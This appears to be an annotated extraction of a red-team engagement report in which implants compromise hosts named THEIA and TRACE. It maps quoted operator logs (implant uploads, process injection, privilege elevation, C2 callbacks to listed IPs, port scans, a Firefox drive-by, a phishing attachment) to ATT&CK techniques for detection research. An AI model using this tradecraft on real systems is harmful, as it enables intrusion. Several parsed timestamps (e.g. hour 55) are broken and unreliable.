   - Raw: The plan did not work as expected because of process injection failing. The connection was left open from the previous attack and remained open. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had 2 open connections to the THEIA host, the first one from a few days ago running as a new process with root privileges and the second one running as a new process executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and elevating it as a new process with root privileges.
   - Time: `-` / `-`
   - Observables: process_name=sshd; process_name=drakon; process_name=micro; command=The plan did not work as expected because of process injection failing. The connection was left open from the previous attack and remained open. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had 2 open connections to the THEIA host, the first one from a few days ago running as a new process with root privileges and the second one running as a new process executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and elevating it as a new process with root privileges.; host=THEIA; email_artifact=micro apt
1. `3_11_e004` | `event_log` | `3.11.2 Event Log` | lines `879-879`
   - Raw: 1244 log
   - Time: `1244` / `2018-04-12T12:44:00`
   - Observables: -
1. `3_11_e005` | `event_log` | `3.11.2 Event Log` | lines `880-880`
   - Raw: 1244 www.gatech.edu loaderDrakon browser ext
   - Time: `1244` / `2018-04-12T12:44:00`
   - Observables: domain=www.gatech.edu; process_name=drakon; process_name=loaderdrakon
1. `3_11_e006` | `event_log` | `3.11.2 Event Log` | lines `881-881`
   - Raw: 1250 www.gatech.edu drakon browser ext
   - Time: `1250` / `2018-04-12T12:50:00`
   - Observables: domain=www.gatech.edu; process_name=drakon
1. `3_11_e007` | `event_log` | `3.11.2 Event Log` | lines `882-882`
   - Raw: 1251 whoami
   - Time: `1251` / `2018-04-12T12:51:00`
   - Observables: command=1251 whoami
1. `3_11_e008` | `event_log` | `3.11.2 Event Log` | lines `883-883`
   - Raw: 1251 ps
   - Time: `1251` / `2018-04-12T12:51:00`
   - Observables: command=1251 ps
1. `3_11_e009` | `event_log` | `3.11.2 Event Log` | lines `884-884`
   - Raw: * 1226    1   root (sshd)
   - Time: `-` / `-`
   - Observables: process_name=sshd
1. `3_11_e010` | `event_log` | `3.11.2 Event Log` | lines `886-886`
   - Raw: 1253 inject /var/log/xdev 1226 (missed connect out)
   - Time: `1253` / `2018-04-12T12:53:00`
   - Observables: file_path=/var/log/xdev; command=1253 inject /var/log/xdev 1226 (missed connect out)
1. `3_11_e011` | `event_log` | `3.11.2 Event Log` | lines `887-887`
   - Raw: 1257 L3: cp /var/log/xdev wdev
   - Time: `1257` / `2018-04-12T12:57:00`
   - Observables: file_path=/var/log/xdev
1. `3_11_e012` | `event_log` | `3.11.2 Event Log` | lines `888-888`
   - Raw: 1257 inject /var/log/wdev 1226 (missed connect out)
   - Time: `1257` / `2018-04-12T12:57:00`
   - Observables: file_path=/var/log/wdev; command=1257 inject /var/log/wdev 1226 (missed connect out)
1. `3_11_e013` | `event_log` | `3.11.2 Event Log` | lines `889-889`
   - Raw: 1303 putfile /tmp/memtrace.so
   - Time: `1303` / `2018-04-12T13:03:00`
   - Observables: file_path=/tmp/memtrace.so; command=1303 putfile /tmp/memtrace.so; host=TRACE
1. `3_11_e014` | `event_log` | `3.11.2 Event Log` | lines `890-890`
   - Raw: 1309 inject multiple times (failed, sshd crash?)
   - Time: `1309` / `2018-04-12T13:09:00`
   - Observables: process_name=sshd; command=1309 inject multiple times (failed, sshd crash?)
1. `3_11_e015` | `event_log` | `3.11.2 Event Log` | lines `891-891`
   - Raw: 1317 putfile /var/log/mail (micro)
   - Time: `1317` / `2018-04-12T13:17:00`
   - Observables: file_path=/var/log/mail; process_name=micro; command=1317 putfile /var/log/mail (micro)
1. `3_11_e016` | `event_log` | `3.11.2 Event Log` | lines `892-892`
   - Raw: 1317 elevate /var/log/mail 149.52.198.23
   - Time: `1317` / `2018-04-12T13:17:00`
   - Observables: file_path=/var/log/mail; command=1317 elevate /var/log/mail 149.52.198.23
1. `3_11_e017` | `event_log` | `3.11.2 Event Log` | lines `893-893`
   - Raw: 1317 c2 connection
   - Time: `1317` / `2018-04-12T13:17:00`
   - Observables: -
1. `3_11_e018` | `event_log` | `3.11.2 Event Log` | lines `894-894`
   - Raw: 1326 rm mail
   - Time: `1326` / `2018-04-12T13:26:00`
   - Observables: -
1. `3_11_e019` | `event_log` | `3.11.2 Event Log` | lines `895-895`
   - Raw: 1326 quit
   - Time: `1326` / `2018-04-12T13:26:00`
   - Observables: -
1. `3_11_e020` | `address` | `3.11.3 Addresses` | lines `899-900`
   - Raw: [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014  TRACE libdrakon.linux.x64.so (failed)
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=5.214.163.155:80; ip_port=128.55.12.167:8014; process_name=drakon; host=TRACE
1. `3_11_e021` | `address` | `3.11.3 Addresses` | lines `901-901`
   - Raw: [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 THEIA loaderDrakon.linux.x64
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=146.153.68.151:80; ip_port=128.55.12.167:8017; domain=loaderDrakon.linux; process_name=drakon; process_name=loaderdrakon; host=THEIA
1. `3_11_e022` | `address` | `3.11.3 Addresses` | lines `902-902`
   - Raw: [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 THEIA webserver
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=104.228.117.212:80; ip_port=128.55.12.167:8018; host=THEIA
1. `3_11_e023` | `address` | `3.11.3 Addresses` | lines `903-903`
   - Raw: [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 THEIA shellcode_server
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=141.43.176.203:80; ip_port=128.55.12.167:8019; host=THEIA
1. `3_11_e024` | `address` | `3.11.3 Addresses` | lines `904-904`
   - Raw: [eth0:950] 149.52.198.23:80 -> 128.55.12.167:8060  THEIA micro
   - Time: `23:80` / `2018-04-12T23:80:00`
   - Observables: ip_port=149.52.198.23:80; ip_port=128.55.12.167:8060; process_name=micro; host=THEIA
1. `3_11_e025` | `interaction_connection` | `3.11.4.1 Connections` | lines `909-909`
   - Raw: exploit: www.gatech.edu 104.228.117.212:80
   - Time: `-` / `-`
   - Observables: ip_port=104.228.117.212:80; domain=www.gatech.edu
1. `3_11_e026` | `interaction_connection` | `3.11.4.1 Connections` | lines `910-910`
   - Raw: Firefox: connection to 141.43.176.203:80
   - Time: `-` / `-`
   - Observables: ip_port=141.43.176.203:80; process_name=firefox
1. `3_11_e027` | `interaction_file` | `3.11.5.1 Files` | lines `915-915`
   - Raw: L2>cp xdev wdev
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e028` | `interaction_file` | `3.11.5.1 Files` | lines `916-916`
   - Raw: L3>rm xdev (failed)
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e029` | `interaction_file` | `3.11.5.1 Files` | lines `917-917`
   - Raw: L2>rm xdev
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e030` | `interaction_file` | `3.11.5.1 Files` | lines `918-918`
   - Raw: L2>rm wdev
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e031` | `interaction_file` | `3.11.5.1 Files` | lines `919-919`
   - Raw: L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 memtrace.so
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.linux.x64.so_5.214.163.155; domain=libdrakon.linux; process_name=drakon; command=L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 memtrace.so; host=TRACE
1. `3_11_e032` | `interaction_file` | `3.11.5.1 Files` | lines `920-920`
   - Raw: L2>putfile ./deploy/archive/microapt.linux.x64_149.52.198.23 mail
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/microapt.linux.x64_149.52.198.23; domain=microapt.linux; process_name=micro; command=L2>putfile ./deploy/archive/microapt.linux.x64_149.52.198.23 mail; email_artifact=microapt
1. `3_11_e033` | `interaction_file` | `3.11.5.1 Files` | lines `921-921`
   - Raw: L2>rm mail
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e034` | `interaction_process` | `3.11.5.2 Processes` | lines `923-923`
   - Raw: L3>inject /var/log/xdev 1226 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/var/log/xdev; command=L3>inject /var/log/xdev 1226 (failed)
1. `3_11_e035` | `interaction_process` | `3.11.5.2 Processes` | lines `924-924`
   - Raw: L3>inject /var/log/wdev 1226 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/var/log/wdev; command=L3>inject /var/log/wdev 1226 (failed)
1. `3_11_e036` | `interaction_process` | `3.11.5.2 Processes` | lines `925-925`
   - Raw: L3>inject /tmp/memtrace.so 1226 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/memtrace.so; command=L3>inject /tmp/memtrace.so 1226 (failed); host=TRACE
1. `3_11_e037` | `interaction_process` | `3.11.5.2 Processes` | lines `926-926`
   - Raw: L3>inject /tmp/memtrace.so 13776 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/memtrace.so; command=L3>inject /tmp/memtrace.so 13776 (failed); host=TRACE
1. `3_11_e038` | `interaction_process` | `3.11.5.2 Processes` | lines `927-927`
   - Raw: L3>inject /tmp/memtrace.so 14204 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/memtrace.so; command=L3>inject /tmp/memtrace.so 14204 (failed); host=TRACE
1. `3_11_e039` | `interaction_process` | `3.11.5.2 Processes` | lines `928-928`
   - Raw: L3>inject /tmp/memtrace.so 14228 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/memtrace.so; command=L3>inject /tmp/memtrace.so 14228 (failed); host=TRACE
1. `3_11_e040` | `interaction_process` | `3.11.5.2 Processes` | lines `929-929`
   - Raw: L2>elevate /var/log/mail
   - Time: `-` / `-`
   - Observables: file_path=/var/log/mail; command=L2>elevate /var/log/mail
1. `3_11_e041` | `interaction_connection` | `3.11.5.3 Connections` | lines `932-932`
   - Raw: gtcache: connection to 146.153.68.151
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e042` | `interaction_connection` | `3.11.6.1 Connections` | lines `937-937`
   - Raw: exploit: www.gatech.edu 104.228.117.212:80
   - Time: `-` / `-`
   - Observables: ip_port=104.228.117.212:80; domain=www.gatech.edu
1. `3_11_e043` | `interaction_connection` | `3.11.6.1 Connections` | lines `938-938`
   - Raw: Firefox: connection to 141.43.176.203:80
   - Time: `-` / `-`
   - Observables: ip_port=141.43.176.203:80; process_name=firefox
1. `3_11_e044` | `interaction_connection` | `3.11.6.1 Connections` | lines `939-939`
   - Raw: gtcache: connection to 146.153.68.151
   - Time: `-` / `-`
   - Observables: -
1. `3_11_e045` | `interaction_connection` | `3.11.6.1 Connections` | lines `940-940`
   - Raw: APT>scan 128.55.12.73 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e046` | `interaction_connection` | `3.11.6.1 Connections` | lines `941-941`
   - Raw: APT>scan 128.55.12.166 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e047` | `interaction_connection` | `3.11.6.1 Connections` | lines `942-942`
   - Raw: APT>scan 128.55.12.67 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e048` | `interaction_connection` | `3.11.6.1 Connections` | lines `943-943`
   - Raw: APT>scan 128.55.12.67 3000 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e049` | `interaction_connection` | `3.11.6.1 Connections` | lines `944-944`
   - Raw: APT>scan 128.55.12.67 4000 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e050` | `interaction_connection` | `3.11.6.1 Connections` | lines `945-945`
   - Raw: APT>scan 128.55.12.141 22 1000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e051` | `interaction_connection` | `3.11.6.1 Connections` | lines `946-946`
   - Raw: APT>scan 128.55.12.141 1000 2000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e052` | `interaction_connection` | `3.11.6.1 Connections` | lines `947-947`
   - Raw: APT>scan 128.55.12.141 2000 3000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e053` | `interaction_connection` | `3.11.6.1 Connections` | lines `948-948`
   - Raw: APT>scan 128.55.12.141 3000 4000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e054` | `interaction_connection` | `3.11.6.1 Connections` | lines `949-949`
   - Raw: APT>scan 128.55.12.141 3388 3390
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e055` | `interaction_connection` | `3.11.6.1 Connections` | lines `950-950`
   - Raw: APT>scan 128.55.12.110 22 1000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e056` | `interaction_connection` | `3.11.6.1 Connections` | lines `951-951`
   - Raw: APT>scan 128.55.12.110 200 1000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e057` | `interaction_connection` | `3.11.6.1 Connections` | lines `952-952`
   - Raw: APT>scan 128.55.12.110 1000 3000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e058` | `interaction_connection` | `3.11.6.1 Connections` | lines `953-953`
   - Raw: APT>scan 128.55.12.110 3000 5000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e059` | `interaction_connection` | `3.11.6.1 Connections` | lines `954-954`
   - Raw: APT>scan 128.55.12.110 5000 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e060` | `interaction_connection` | `3.11.6.1 Connections` | lines `955-955`
   - Raw: APT>scan 128.55.12.110 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e061` | `interaction_connection` | `3.11.6.1 Connections` | lines `956-956`
   - Raw: APT>scan 128.55.12.118 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e062` | `interaction_connection` | `3.11.6.1 Connections` | lines `957-957`
   - Raw: APT>scan 128.55.12.10 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e063` | `interaction_connection` | `3.11.6.1 Connections` | lines `958-958`
   - Raw: APT>scan 128.55.12.1 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_11_e064` | `interaction_connection` | `3.11.6.1 Connections` | lines `959-959`
   - Raw: APT>scan 128.55.12.55 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -

### THEIA_20180413_1350_1404_04 / Section 4.8

- 标题：`20180413 1400 THEIA – Phishing E-mail w/ Executable Attachment`
- 状态：`attempted_failed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-13T13:50:00` -> `2018-04-13T14:04:00`
- Markdown 行号：`1624-1654`
- 报告页：`39`
- 攻击概述：THEIA 上的恶意可执行附件 tcexec 被用户下载并运行，但因缺少依赖而失败，没有形成后续驻留或回连。
- 备注：该节是标准的 attempted_failed：有投递、有打开执行，但没有形成成功链。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | attempted | 初始进入 | 钓鱼附件被送达并打开，但没有形成成功控制。 | 4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008 |
| EXECUTION | attempted | 执行 | 用户执行了恶意可执行文件，但因依赖缺失而失败。 | 4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008, 4_8_e001, 4_8_e007 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1566.001 | attempted | 报告明确写到通过恶意可执行附件投递。 | 4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008 |
| T1204.002 | attempted | 用户实际打开并运行了恶意附件。 | 4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| phishing_attachment | attachment_open | attempted | 恶意可执行附件 tcexec 被发送、打开并运行。 | 4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008 |
| payload_crash | payload_crash | attempted | 报告明确写到 failed missing library。 | 4_8_e001, 4_8_e007 |

#### 显式观测

- `host` / `THEIA`  Evidence: `4_8_e001`  Raw: THEIA
- `email_artifact` / `tcexec`  Evidence: `4_8_e003, 4_8_e004, 4_8_e005, 4_8_e008`  Raw: tcexec

#### 原始子节摘录

- `4.8.lead` Section Lead (lines 1626-1628)

  > The attacker tried to attack THEIA using an e-mail with a malicious executable attachment. The user
  > downloaded and ran the attachment; however, it failed to execute because of missing dependencies on
  > the target environment.

- `4.8.1` Comments (lines 1630-1636)

  > We discovered that the executable we had sent would not run as expected on the target. We learned
  > the night before that QT was required, and we installed it since we could not get it to statically link
  > during the engagement. We simulated the user downloading and executing the file, but the file failed to
  > run and the attack failed.

- `4.8.2` Event Log (lines 1637-1644)

  > - 13:50 from bob to everyone tcexec (malicious executable)
  > - Open tcexec, run it
  > - 14:04 manual download tcexec to desktop
  > - 14:04 run it
  > - 14:04 failed missing library

- `4.8.3` Interactions (lines 1645-1646)
- `4.8.3.1` Files (lines 1647-1650)

  > - tcexec file downloaded to disk from e-mail

- `4.8.4` Graph (lines 1651-1654)
#### 证据条目

1. `4_8_e001` | `narrative_comment` | `4.8.lead Section Lead` | lines `1626-1628`
   - Raw: The attacker tried to attack THEIA using an e-mail with a malicious executable attachment. The user downloaded and ran the attachment; however, it failed to execute because of missing dependencies on the target environment.
   - Time: `-` / `-`
   - Observables: host=THEIA
1. `4_8_e002` | `narrative_comment` | `4.8.1 Comments` | lines `1632-1635`
   - Raw: We discovered that the executable we had sent would not run as expected on the target. We learned the night before that QT was required, and we installed it since we could not get it to statically link during the engagement. We simulated the user downloading and executing the file, but the file failed to run and the attack failed.
   - Time: `-` / `-`
   - Observables: -
1. `4_8_e003` | `event_log` | `4.8.2 Event Log` | lines `1639-1639`
   - Raw: 13:50 from bob to everyone tcexec (malicious executable)
   - Time: `13:50` / `2018-04-13T13:50:00`
   - Observables: email_artifact=tcexec
1. `4_8_e004` | `event_log` | `4.8.2 Event Log` | lines `1640-1640`
   - Raw: Open tcexec, run it
   - Time: `-` / `-`
   - Observables: email_artifact=tcexec
1. `4_8_e005` | `event_log` | `4.8.2 Event Log` | lines `1641-1641`
   - Raw: 14:04 manual download tcexec to desktop
   - Time: `14:04` / `2018-04-13T14:04:00`
   - Observables: email_artifact=tcexec
1. `4_8_e006` | `event_log` | `4.8.2 Event Log` | lines `1642-1642`
   - Raw: 14:04 run it
   - Time: `14:04` / `2018-04-13T14:04:00`
   - Observables: -
1. `4_8_e007` | `event_log` | `4.8.2 Event Log` | lines `1643-1643`
   - Raw: 14:04 failed missing library
   - Time: `14:04` / `2018-04-13T14:04:00`
   - Observables: -
1. `4_8_e008` | `interaction_file` | `4.8.3.1 Files` | lines `1649-1649`
   - Raw: tcexec file downloaded to disk from e-mail
   - Time: `-` / `-`
   - Observables: email_artifact=tcexec


## TRACE

### TRACE_20180410_0946_1109_01 / Section 3.2

- 标题：`20180410 1000 TRACE – Firefox Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-10T09:46:00` -> `2018-04-10T11:09:00`
- Markdown 行号：`238-319`
- 报告页：`5, 6`
- 攻击概述：TRACE 通过恶意网站/广告利用 Firefox，drakon 在内存中获得 shell，随后把 drakon/libdrakon 落盘并提权为 root 进程，留下开放连接。
- 备注：窗口保留多次 Firefox crash 作为 exploit 失败重试背景，但 confirmed tactics 只统计最终成功形成的攻击行为。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 恶意网站 exploit 成功形成 TRACE 的初始进入。 | 3_2_e001, 3_2_e002, 3_2_e005, 3_2_e006, 3_2_e007, 3_2_e008, 3_2_e009, 3_2_e010, 3_2_e011, 3_2_e013, 3_2_e014, 3_2_e029 |
| EXECUTION | confirmed | 执行 | drakon 被写盘后再次执行，形成显式载荷执行。 | 3_2_e018, 3_2_e026, 3_2_e027, 3_2_e028, 3_2_e001, 3_2_e015 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | 正文明确写到新 drakon 进程以 root 运行。 | 3_2_e001, 3_2_e015, 3_2_e028 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | operator console/OC2 回连在正文、Event Log、连接交互三处共同支撑。 | 3_2_e001, 3_2_e014, 3_2_e032 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1189 | confirmed | 通过恶意网站/广告触发 Firefox exploit。 | 3_2_e001, 3_2_e002, 3_2_e005, 3_2_e006, 3_2_e007, 3_2_e008, 3_2_e009, 3_2_e010, 3_2_e011, 3_2_e013, 3_2_e014, 3_2_e029 |
| T1071.001 | confirmed | 攻击者通过 web/HTTP 风格连接维持 drakon/operator console 通信。 | 3_2_e001, 3_2_e014, 3_2_e032 |
| T1105 | confirmed | putfile 明确把 drakon/libdrakon 传入目标主机。 | 3_2_e018, 3_2_e026, 3_2_e027, 3_2_e028 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| driveby_exploit | exploit_delivery | confirmed | 正文写明通过 www.allstate.com 恶意广告/网站成功利用 Firefox。 | 3_2_e001, 3_2_e002, 3_2_e005, 3_2_e006, 3_2_e007, 3_2_e008, 3_2_e009, 3_2_e010, 3_2_e011, 3_2_e013, 3_2_e014, 3_2_e029 |
| c2_callback | c2_callback | confirmed | 正文写明 drakon 在 Firefox 内存中回连 operator console，Event Log 也记录了收到 OC2 连接。 | 3_2_e001, 3_2_e014, 3_2_e032 |
| payload_write | payload_write | confirmed | putfile 明确把 drakon 和 libdrakon 写到目标磁盘。 | 3_2_e018, 3_2_e026, 3_2_e027, 3_2_e028 |
| payload_elevate | payload_elevate | confirmed | 正文与交互都明确写明 drakon 从磁盘以 root 身份执行。 | 3_2_e001, 3_2_e015, 3_2_e028 |

#### 显式观测

- `domain` / `www.allstate.com`  Evidence: `3_2_e001, 3_2_e002, 3_2_e005, 3_2_e006, 3_2_e007, 3_2_e008, 3_2_e009, 3_2_e010, 3_2_e011, 3_2_e013, 3_2_e029`  Raw: www.allstate.com
- `process_name` / `firefox`  Evidence: `3_2_e001, 3_2_e004, 3_2_e005, 3_2_e006, 3_2_e030, 3_2_e031`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_2_e001, 3_2_e015, 3_2_e018, 3_2_e023, 3_2_e024, 3_2_e025, 3_2_e026, 3_2_e027`  Raw: drakon
- `command` / `Began attack with TRACE Ubuntu 14.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.allstate.com website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shells and switched over to the root shell. The attacker then wrote another file to disk to be used later and left the connection to the operator console open. Unfortunately, the operator console crashed not long after, and the connection was unintentionally lost.`  Evidence: `3_2_e001`  Raw: putfile
- `host` / `TRACE`  Evidence: `3_2_e001, 3_2_e002, 3_2_e004, 3_2_e005, 3_2_e006, 3_2_e007, 3_2_e008, 3_2_e009, 3_2_e010, 3_2_e011, 3_2_e013, 3_2_e021, 3_2_e022, 3_2_e023, 3_2_e024, 3_2_e025`  Raw: TRACE
- `host` / `CADETS`  Evidence: `3_2_e002`  Raw: CADETS
- `host` / `THEIA`  Evidence: `3_2_e002, 3_2_e004`  Raw: THEIA
- `command` / `10:51 elevate drakon`  Evidence: `3_2_e015`  Raw: elevate
- `file_path` / `/deploy/archive/libdrakon.linux.x64.so_5.214.163.155`  Evidence: `3_2_e018, 3_2_e027`  Raw: /deploy/archive/libdrakon.linux.x64.so_5.214.163.155
- `file_path` / `/var/log/xtmp`  Evidence: `3_2_e018`  Raw: /var/log/xtmp
- `domain` / `libdrakon.linux`  Evidence: `3_2_e018, 3_2_e027`  Raw: libdrakon.linux
- `command` / `11:09 putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 /var/log/xtmp`  Evidence: `3_2_e018`  Raw: putfile
- `ip_port` / `145.199.103.57:80`  Evidence: `3_2_e021, 3_2_e029`  Raw: 145.199.103.57:80
- `ip_port` / `128.55.12.167:8010`  Evidence: `3_2_e021`  Raw: 128.55.12.167:8010
- `ip_port` / `61.130.69.232:80`  Evidence: `3_2_e022, 3_2_e030`  Raw: 61.130.69.232:80
- `ip_port` / `128.55.12.167:8011`  Evidence: `3_2_e022`  Raw: 128.55.12.167:8011
- `ip_port` / `2.233.33.52:80`  Evidence: `3_2_e023`  Raw: 2.233.33.52:80
- `ip_port` / `128.55.12.167:8012`  Evidence: `3_2_e023`  Raw: 128.55.12.167:8012
- `domain` / `loaderDrakon.linux`  Evidence: `3_2_e023`  Raw: loaderDrakon.linux
- `process_name` / `loaderdrakon`  Evidence: `3_2_e023`  Raw: loaderdrakon
- `ip_port` / `180.156.107.146:80`  Evidence: `3_2_e024`  Raw: 180.156.107.146:80
- `ip_port` / `128.55.12.167:8013`  Evidence: `3_2_e024`  Raw: 128.55.12.167:8013
- `domain` / `drakon.linux`  Evidence: `3_2_e024, 3_2_e026`  Raw: drakon.linux
- `ip_port` / `5.214.163.155:80`  Evidence: `3_2_e025`  Raw: 5.214.163.155:80
- `ip_port` / `128.55.12.167:8014`  Evidence: `3_2_e025`  Raw: 128.55.12.167:8014
- `file_path` / `/deploy/archive/drakon.linux.x64_180.156.107.146`  Evidence: `3_2_e026`  Raw: /deploy/archive/drakon.linux.x64_180.156.107.146
- `file_path` / `/home/admin/cache`  Evidence: `3_2_e026, 3_2_e028`  Raw: /home/admin/cache
- `command` / `L1>putfile ./deploy/archive/drakon.linux.x64_180.156.107.146 /home/admin/cache`  Evidence: `3_2_e026`  Raw: putfile
- `command` / `L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xtmp`  Evidence: `3_2_e027`  Raw: putfile
- `command` / `L1>elevate /home/admin/cache`  Evidence: `3_2_e028`  Raw: elevate
- `ip_port` / `2.233.33.53:80`  Evidence: `3_2_e031`  Raw: 2.233.33.53:80

#### 原始子节摘录

- `3.2.lead` Section Lead (lines 240-249)

  > Began attack with TRACE Ubuntu 14.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via
  > the www.allstate.com website. The exploit resulted in the drakon implant running in memory in the
  > Firefox process with a connection out to the attacker operator console. The attacker used putfile to
  > write a drakon implant executable binary to the target host's disk. The attacker then executed the
  > drakon implant from the target disk using a privilege escalated execution capability to run the new
  > process as root. The new root drakon implant process connected out to the operator console to give
  > the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root
  > shells and switched over to the root shell. The attacker then wrote another file to disk to be used later
  > and left the connection to the operator console open. Unfortunately, the operator console crashed not
  > long after, and the connection was unintentionally lost.

- `3.2.1` Comments (lines 251-270)

  > Our second target was the Linux development computers. Had we been able to persist on the CADETS
  > host, we would have performed some network recon to discover the THEIA and TRACE hosts. In this
  > case, since that did not happen, we instead used an advertisement server to host a malicious
  > advertisement. In this case, the exploit was sent via an ad on the www.allstate.com website. The goal
  > of the attack was to drop a malicious payload to disk which would be triggered later during the
  > engagement period via a different access method.
  > We encountered several problems during the attack. The first exploit attempt resulted in Firefox
  > crashing. The second attempt resulted in Firefox crashing and the TRACE host locking up for while,
  > which resulted in a huge spike of activity in TRACE's publishing. The spike was large enough that the
  > TRACE team noticed and contacted BBN about accessing the host to check logs. It was later determined
  > from the logs that TRACE had dropped some records during the spike but ultimately recovered. While
  > waiting for the system to recover, we moved on to target THEIA. As the THEIA host was also
  > experiencing performance issues, we returned half an hour later and tried again. For some reason, the
  > Firefox exploit failed a few more times and crashed Firefox before eventually working and resulting in a
  > shell.

- `3.2.2` Event Log (lines 271-289)

  > - 09:46 TRACE www.allstate.com script connect but fail firefox crash
  > - 09:48 TRACE Firefox opened to www.allstate.com and fail, system locked up
  > - 10:22 TRACE www.allstate.com
  > - 10:26 TRACE www.allstate.com
  > - 10:30 TRACE www.allstate.com crash?
  > - 10:31 TRACE www.allstate.com
  > - 10:40 TRACE www.allstate.com
  > - OC2 2.233.33.53 (multiple failed connection attempts)
  > - 10:49 TRACE www.allstate.com
  > - 10:49 Received 2 connections to the OC2
  > - 10:51 elevate drakon
  > - 10:53 quit L1
  > - 10:53 quit L2
  > - 11:09 putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 /var/log/xtmp
  > - Left L3 connection open
  > - Lost L3 connection when OC2 crashed

- `3.2.3` Addresses (lines 290-297)

  > - [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 TRACE webserver
  > - [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011   TRACE shellcode_server
  > - [eth0:892] 2.233.33.52:80 -> 128.55.12.167:8012    TRACE loaderDrakon.linux.x64
  > - [eth0:893] 180.156.107.146:80 -> 128.55.12.167:8013 TRACE drakon.linux.x64
  > - [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014   TRACE libdrakon.linux.x64.so

- `3.2.4` Interactions (lines 298-299)
- `3.2.4.1` Files (lines 300-304)

  > - L1>putfile ./deploy/archive/drakon.linux.x64_180.156.107.146 /home/admin/cache
